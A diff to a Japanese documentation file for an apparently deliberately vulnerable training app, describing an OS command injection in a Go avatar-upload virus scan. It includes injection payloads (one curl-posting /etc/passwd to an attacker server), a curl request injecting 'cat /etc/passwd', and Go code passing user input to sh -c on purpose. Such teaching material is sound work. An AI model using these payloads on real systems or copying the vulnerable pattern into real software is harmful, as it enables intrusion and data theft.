@@ -18,6 +18,20 @@
    - `avatar.jpg; ls -la /`
    - `avatar.jpg && cat /etc/passwd`
    - `avatar.jpg | curl -X POST -d @/etc/passwd https://攻撃者のサーバー/`
+3. curlでファイルアップロードを実行する例
+```bash
+# Base64エンコードされた画像データを含むcurlコマンド例
+# 小さなPNG画像をBase64エンコードしたデータ
+curl 'http://localhost:9090/api/profile/avatar' \
+  -H 'Authorization: Bearer alice_token' \
+  -H 'Content-Type: application/json' \
+  --data-raw '{
+    "file_id":"avatar.jpg && cat /etc/passwd",
+    "image_data":"R0lGODlhAQABAIAAAP///////yH+BnBzYV9sbAAh+QQBCgABACwAAAAAAQABAAACAkwBADs="
+  }'
+```
+4. `malware_scan`というフィールドにOSコマンドの出力結果が返却されます
+
 
 ## 実装の詳細
 アバター画像データはBase64エンコードされた形式でデータベースに直接保存されます。ただし、ウィルススキャンを行うために、一時的にファイルシステムに保存されます。この一時ファイルは処理完了後に削除されますが、ウィルススキャン処理中に脆弱性が発生します。
@@ -27,47 +41,46 @@
 func (h *Handler) UploadAvatar(c *gin.Context) {
     // ... 省略 ...
     
-    // 一時ファイルの保存（ウィルススキャン用）
-    filePath := filepath.Join(uploadDir, req.FileID)
-    if err := os.WriteFile(filePath, imageData, 0644); err != nil {
-        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to save temporary file"})
-        return
-    }
-    defer os.Remove(filePath) // 処理完了後に一時ファイルを削除
+	// 一時ファイルの保存（ウィルススキャン用）
+	tempFileName := fmt.Sprintf("%d.png", time.Now().Unix())
+	filePath := filepath.Join(uploadDir, tempFileName)
+	if err := os.WriteFile(filePath, imageData, 0644); err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to save temporary file"})
+		return
+	}
+	defer os.Remove(filePath) // 処理完了後に一時ファイルを削除
 
-    // 脆弱性: OSコマンドインジェクション
-    // ユーザー入力（FileID）を適切にエスケープせずにコマンドに渡している
-    if err := scanFile(filePath); err != nil {
-        c.JSON(http.StatusBadRequest, gin.H{"error": "Virus detected or scan failed"})
-        return
-    }
+	// 脆弱性: OSコマンドインジェクション
+	// ユーザー入力（FileID）を適切にエスケープせずにコマンドに渡している
+	scanResult, err := scanFile(filePath, req.FileID)
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Virus detected or scan failed", "scan_result": scanResult})
+		return
+	}
     
     // ... 省略 ...
 }
 
-func scanFile(filePath string) error {
-    // 脆弱性: OSコマンドインジェクション
-    // ユーザー入力（filePath）を適切にエスケープせずにコマンドに渡している
-    cmd := exec.Command("sh", "-c", "echo 'Scanning file: "+filePath+"' && grep -q 'virus_signature' "+filePath)
-    output, err := cmd.CombinedOutput()
-    if err != nil {
-        if exitErr, ok := err.(*exec.ExitError); ok && exitErr.ExitCode() == 1 {
-            // grepコマンドがパターンを見つけられなかった場合（終了コード1）は正常とみなす
-            return nil
-        }
-        log.Printf("ウィルススキャンエラー: %v, 出力: %s", err, string(output))
-        return err
-    }
-    return fmt.Errorf("ウィルスが検出されました")
+func scanFile(filePath string, fileID string) (string, error) {
+	// 脆弱性: OSコマンドインジェクション
+	// ユーザー入力（fileID）を適切にエスケープせずにコマンドに渡している
+	cmd := exec.Command("sh", "-c", "echo 'Scanning file: ' && echo "+fileID)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return string(output), fmt.Errorf("ウィルスが検出されました: fileID=%s, filePath=%s", fileID, filePath)
+	}
+	return string(output), nil
 }
+
 ```
 
 ## 対策方法
 1. OSコマンドを使用せずに、プログラム内部でファイルの検査を行う
 2. 必要に応じてOSコマンドを使用する場合は、以下の対策を行う：
+   - ユーザの入力値は基本的にコマンドライン引数に渡さない
+   - ユーザの入力値をバリデーションする
    - ユーザー入力を適切にエスケープする
    - シェル（sh, bash）を介さずに直接コマンドを実行する
-   - コマンドライン引数を配列として渡す
 
 ### 修正例
 ```go
